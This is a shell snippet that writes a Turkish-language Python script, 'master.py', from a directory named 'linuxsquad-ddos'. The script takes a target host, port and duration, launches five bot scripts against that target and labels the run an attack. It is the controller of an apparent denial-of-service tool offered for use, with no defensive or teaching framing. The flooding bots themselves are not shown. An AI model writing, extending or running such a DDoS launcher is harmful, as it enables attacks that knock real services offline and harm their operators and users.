cd \~/linuxsquad-ddos

cat > master.py << 'EOF'
import subprocess
import time
import sys
import os

os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════════════════╗")
print("║                 LINUXSQUAD MASTER v5.1 - 5 BOT ULTRA                         ║")
print("║                      Toplam Güç Takip Sistemi                                ║")
print("╚══════════════════════════════════════════════════════════════════════════════╝")
print("\033[0m")

if len(sys.argv) < 3:
    print("Kullanım: python master.py <HEDEF> <PORT> [SÜRE]")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60

print(f"\033[91m[+] Master Başlatıldı → Hedef: {target}:{port} | Süre: {duration} saniye\033[0m")
print("\033[93m[+] 5 Bot başlatılıyor... (Telefon biraz donabilir)\033[0m\n")

bots = []
for i in range(1, 6):
    print(f"\033[92m[→] Bot{i} başlatılıyor...\033[0m")
    try:
        bot = subprocess.Popen(["python", f"bot{i}.py", target, str(port), str(duration)])
        bots.append(bot)
        time.sleep(2)        # Botlar arası 2 saniye ara → daha az donma
    except Exception as e:
        print(f"\033[91m[!] Bot{i} başlatılamadı: {e}\033[0m")

print("\n\033[92m[+] TÜM 5 BOT AKTİF! Saldırı devam ediyor...\033[0m")
print("\033[93m   En yüksek değeri izle. Durdurmak için Ctrl + C\033[0m\n")

try:
    time.sleep(duration)
except KeyboardInterrupt:
    print("\n\033[91m[-] Saldırı durduruldu...\033[0m")

for i, bot in enumerate(bots, 1):
    if bot.poll() is None:
        bot.terminate()
        print(f"\033[91m[×] Bot{i} durduruldu\033[0m")

print("\033[92m[+] Tüm botlar kapatıldı.\033[0m")
EOF
